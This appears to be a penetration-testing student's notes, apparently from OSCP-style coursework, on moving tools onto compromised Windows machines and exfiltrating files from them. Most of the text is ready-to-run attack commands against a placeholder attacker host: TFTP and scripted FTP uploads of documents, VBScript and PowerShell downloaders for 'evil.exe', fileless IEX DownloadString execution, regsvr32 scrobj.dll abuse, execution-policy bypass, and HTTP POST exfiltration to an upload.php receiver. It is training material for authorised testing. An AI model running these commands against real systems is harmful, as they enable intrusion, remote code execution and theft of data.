


Post-exploitation of uploading files & tools/ downloading files to the target machine.  
  
*****Meaning, majority of cmds performed will be on the compromised machine, using our Kali as the C2 for downloads
  
These methods could endanger the success of the engagement & should be used w/ caution & only under specific conditions.  
  
- Any post-explioitation attck tools could be abused by malicious parties, putting the client at risk.  
	- It's _extremely important_ to document uploads and remove them after the assessment is completed.  
- Antivirus software can detect our attack tools, quarantine them, and alert a sysadmin.  
	- This could cost us our internal remote shell or, in extreme cases, signal the effective end of the engagement.  
  
As a general rule of thumb, we should always try to use native tools on the compromised system.  
	Uploading addt tools when native ones are insufficient can be done when:  
	- We've determined the risk of detection is minimized, or  
	- When our need outweighs the risk of detection.  
  
  
[Non-Interactive Shell Upgrading](Non-Interactive%20TTY.md)


### Pure-FTP

[Setting up pure-ftpd on Linux](pure-ftpd.md)

### TFTP

[TFTP](tftp.md) is a UDP-based file transfer protocol and is often restricted by corporate egress firewall rules.  
Useful for systems prior to PS's default install: (Windows 7 and Windows Server 2008 R2) , IoT, and other small form-factor devices
  
Setup:  
	On Kali:  
1. Install and configure a TFTP server in Kali and create a directory to store and serve files.  
```bash
sudo apt update && sudo apt install atftp
```


2. Next, we update the ownership of the directory so we can write files to it.  
```bash
sudo mkdir /tftp  
sudo chown nobody: /tftp
```

3. We will run atftpd as a daemon on UDP port 69 and direct it to use the newly created **/tftp** directory  
```bash
sudo atftpd --daemon --port 69 /tftp
```

On Windows:  
1. Run the **tftp** client  
```powershell
tftp -i attacker_ip put important.docx
```
.
- **-i** - Specify binary image transer  
- **put** - Initiates an upload

### Apache 2

```bash
sudo systemctl start apache2
```

web root is located /var/www/html/


### Windows-based file transfers:

#### Non-Interactive FTP:  
  
Windows ships w/ a default [FTP](OS%20Commands.md#ftp) client that can be used for file transfers.  
FTP, however, is an interactive program requiring user input.  

 
Ex: Compromised Win victim connecting to FTP server on Attack/ C2 to download needed binary.  
  
	We'll set up FTP server on kali containing **nc** binary that's needed on Windows victim machine.  
  
  
1. Use setup of FTP server for [Non-Interactive Shell demo](PWK--Concepts--Non-Interactive_Shell.html)  
2. Place a copy of nc.exe in the FTP home directory  
```bash
sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/  
sudo systemctl restart pure-ftpd
```

3. On compromised Win machine, craft a _txt_ file w/ list of **ftp** commands needed to download binary  
```bash
echo open <ftp_ip> 21> ftp.txt  
echo USER offsec>> ftp.txt  
echo lab>> ftp.txt  
echo bin >> ftp.txt  
echo quote pasv >> ftp.txt  
echo GET nc.exe >> ftp.txt  
echo bye >> ftp.txt
```
---------***NOTE:** Very important to notice there's no space btw the commands being echoed & the _**>**_ or _**>>**_ for Lines 1-3..  
	- **open**: Initiates FTP connection to the specified IP address  
	- **USER**: Authenticates as _offsec_ w/ password- _lab_  
	- **bin**: Requests a binary file transfer  
	- **quote pasv:** Puts in passive mode - doesn't get stuck at 200 PORT command successful  
	- **GET**: Reqests specific binary  
	- **bye**: Closes the connection.

4. Initiate FTP session using the _ftp.txt_ command list that'll allow for a non-interactive session (**-s**)  
```bash
ftp -v -n -s:ftp.txt
```
:
	- **-v** - Suppress any returned output *NOTE: may cause _Unknown command_ errors w/ **open**. Removing will work.  
	- **-n** - Suppresses automatic login  
	- **-s** - Indicates name of command file  
  
OR, literally just use those commands in the txt file ^.  
  
THAT being said, if the **tftp** service is available on Win:  
```powershell
tftp -i <attack_ip> GET nc.exe
```
	-- should work  
  
  
Issues: [https://ubuntuforums.org/archive/index.php/t-2124610.html](https://ubuntuforums.org/archive/index.php/t-2124610.html)  



### Scripting Languages:

Leverage scripting engines such as:  
- VBScript[1](https://portal.offensive-security.com/courses/pen-200/books-and-videos/modal/modules/file-transfers/transferring-files-with-windows-hosts/windows-downloads-using-scripting-languages#fn1) (inWindows XP, 2003)  
- PowerShell (in Windows 7, 2008, and above)  
  
  
Ex **wget.vbs.txt**:  
```vb
echo strUrl = WScript.Arguments.Item(0) > wget.vbs  
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs  
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs  
echo  Err.Clear >> wget.vbs  
echo  Set http = Nothing >> wget.vbs  
echo  Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs  
echo  If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs  
echo  If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs  
echo  If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs  
echo  http.Open "GET", strURL, False >> wget.vbs  
echo  http.Send >> wget.vbs  
echo  varByteArray = http.ResponseBody >> wget.vbs  
echo  Set http = Nothing >> wget.vbs  
echo  Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs  
echo  Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs  
echo  strData = "" >> wget.vbs  
echo  strBuffer = "" >> wget.vbs  
echo  For lngCounter = 0 to UBound(varByteArray) >> wget.vbs  
echo  ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs  
echo  Next >> wget.vbs  
echo  ts.Close >> wget.vbs
```

We would then copy/paste these commands into the compromised comp's terminal and run the **wget.vbs** script:  
  
Run w/ **cscript**:  
```powershell
cscript wget.vbs http://attacker_ip/evil.exe evil.exe
```


OR  


Ex **wget.ps1.txt**:  
```powershell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "http://10.11.0.4/evil.exe" >>wget.ps1  
echo $file = "new-exploit.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Again, we'd copy/paste these commands into the compromised comp's terminal and run the resulting **wget.ps1** script:  
  
For proper running:  
```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
.
- **-ExecutionPolicy Bypass** - Bypasses the current ExecutionPolicy  
	- Safety feature that controls the conditions under which PS loads configuration files and runs scripts.  
		- Feature used to specifically prevent running of malicious scripts  
- **-NoLogo** - Hides PS's logo banner  
- **-NonInteractive** - Suppress interactive PS prompt  
- **-NoProfile** - Prevent PS loading the default profile.  
- **-File** - Specifiy the script  
  
  
One-Liner version:  
```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.11.0.4/evil.exe', 'new-exploit.exe')

OR

powershell.exe Invoke-Webrequest -URI http://10.11.0.4/evil.exe -OutFile "new-exploit.exe"


OR

powershell.exe Start-BitsTransfer -Source http://10.11.0.4/evil.exe -Destination "new-exploit.exe"
```


Now: To execute malicious binary w/o saving the file to disk, add the **IEX** cmdlet & use **DownloadString**:  
```powershell
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://10.11.0.4/helloworld.ps1')


OR


regsvr32.exe /s /n /u /i:http://10.11.0.4/evil.exe scrobj.dll
```



### exe2hex & PS

Through a series of non-interactive commands.  
  
Starting on our Kali machine, we will compress the binary we want to transfer, convert it to a hex string, and embed it into a Windows script.  
On the Windows machine, we will paste this script into our shell and run it.  
It will redirect the hex data into powershell.exe, which will assemble it back into a binary.  
  
Setup:
	In Kali:  
1. Copy **nc** binary to our working directory:  
```bash
kali@kali:~$ locate nc.exe | grep binaries  
/usr/share/windows-resources/binaries/nc.exe  
  
kali@kali:~$ cp /usr/share/windows-resources/binaries/nc.exe .  
  
kali@kali:~$ ls -lh nc.exe  
-rwxr-xr-x 1 kali kali 58K Sep 18 14:22 nc.exe
```

2. Compress w/ [upx](PWK--Tools--upx.html):  
```bash
kali@kali:~$ upx -9 nc.exe  
                       Ultimate Packer for eXecutables  
                          Copyright (C) 1996 - 2018  
UPX 3.95        Markus Oberhumer, Laszlo Molnar & John Reiser   Aug 26th 2018  
  
        File size         Ratio      Format      Name  
   --------------------   ------   -----------   -----------  
     59392 ->     29696   50.00%    win32/pe     nc.exe  
Packed 1 file.  
  
kali@kali:~$ ls -lh nc.exe  
-rwxr-xr-x 1 kali kali 29K Sep 18 14:22 nc.exe
```

- Binary's compressed to about 1/2 its size, but it's ([PE](Portable%20Executable.md)) still functional and can be run normally.  
  
3. Use [exe2hex](exe2hex.md) to convert to Windows script (**.cmd**)  
```bash
kali@kali:~$ exe2hex -x nc.exe -p nc.cmd  
[*] exe2hex v1.5.1  
[+] Successfully wrote (PoSh) nc.cmd
```
	- Converts the file to hex and instructs powershell.exe to assemble it back into binary  
  
4. Copy the script into clipboard:  
```bash
cat nc.cmd | xclip -selection clipboard
```

5. Paste into compromised comp's terminal.  
  
  
If copy/ paste doesn't work & you need to download the **.cmd** file from w/in the compromised machine's cmd prompt:  
```powershell
C:\Users\Offsec> powershell -command (New-Object System.Net.WebClient).DownloadFile('http://attacker_ip/evil.cmd', 'evil.cmd')
```



### Exfill via Scripting:

Assuming outbound HTTP traffic is allowed, we can use the _System.Net.WebClient_ PowerShell class to upload data to our Kali machine through an HTTP POST request.  
  
  
Setup:  
  
1. PHP script **upload.php** saved in Kali's **var/www/html**:  
```php
<?php  
$uploaddir = '/var/www/uploads/';  
  
$uploadfile = $uploaddir . $_FILES['file']['name'];  
  
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)  
?>
```
	Processes an incoming file upload request and saves the transferred data to the **/var/www/uploads/** directory.  

2. Create **uploads** folder & modify its perms so _www-data_ is owner & can read/ write:  
```bash
kali@kali:/var/www$ sudo mkdir /var/www/uploads  
  
kali@kali:/var/www$ ps -ef | grep apache  
root      1946     1  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start  
www-data  1947  1946  0 21:39 ?        00:00:00 /usr/sbin/apache2 -k start  
  
kali@kali:/var/www$ sudo chown www-data: /var/www/uploads  
  
kali@kali:/var/www$ ls -la  
total 16  
drwxr-xr-x  4 root     root     4096 Feb  2 00:33 .  
drwxr-xr-x 13 root     root     4096 Sep 20 14:57 ..  
drwxr-xr-x  2 root     root     4096 Feb  2 00:33 html  
drwxr-xr-x  2 www-data www-data 4096 Feb  2 00:33 uploads
```
	*Allows anyone interacting w/ **uploads.php** to send anything to our machine*
  
3. Move to compromised machine's cmd prompt to upload desired doc:
```powershell
C:\Users\Offsec> powershell.exe (New-Object System.Net.WebClient).UploadFile('http://attacker_ip/upload.php', 'full_path/:important.docx')


OR

C:\Users\Offsec> powershell.exe Invoke-RestMethod -Uri http://attakcer_ip/upload.php -Method Post -InFile $uploadpathfile
```



